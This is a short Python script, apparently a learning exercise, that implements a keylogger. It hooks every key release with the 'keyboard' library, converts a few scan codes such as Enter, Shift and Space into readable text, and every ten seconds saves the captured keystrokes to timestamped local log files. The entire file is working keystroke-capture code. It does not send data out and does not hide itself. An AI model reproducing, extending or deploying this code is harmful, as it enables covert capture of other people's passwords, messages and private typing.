import keyboard
from threading import Timer
import time

class Keylogger:
    def __init__(self, time):
        self.log = ''
        self.counter = 1
        self.interval = time
   

    def callback(self, event):
     
        # fixing some special characters 
        
        char_name = event.name
        print(event.scan_code)
        
            
        if event.scan_code ==  28:
            char_name = '\n'

        elif event.scan_code ==  42:
            char_name = '[SHIFT]'

        elif event.scan_code == 53:
            char_name = '/'

        elif event.scan_code == 57:
            char_name = ' '

        elif event.scan_code == 58:
            char_name = '[CAPS LOCK]'
        

        print(f"the char is: {char_name} and the code is: {event.scan_code}\n")
        self.log += char_name



    
    def logging(self):
        if self.log:
            self.track()

        self.log = ''
        # we use the Timer from threading for when we want to have a function run after
        # a certain time frame
       
        timer = Timer(interval=self.interval, function=self.logging)
        timer.daemon = True
        timer.start()


    def track(self): 
        with open(f"log{self.counter}-{time.time()}.txt", "w") as f:
            f.write(self.log)

        print(f"Logged {self.counter} files\n")
        self.counter += 1

    def run(self):
        keyboard.on_release(callback=self.callback)
        self.logging()
        keyboard.wait() #causes a wait until we do ctl-c


if __name__ == "__main__":
    kl = Keylogger(time=10) # every 10 seconds we make a log file
    kl.run()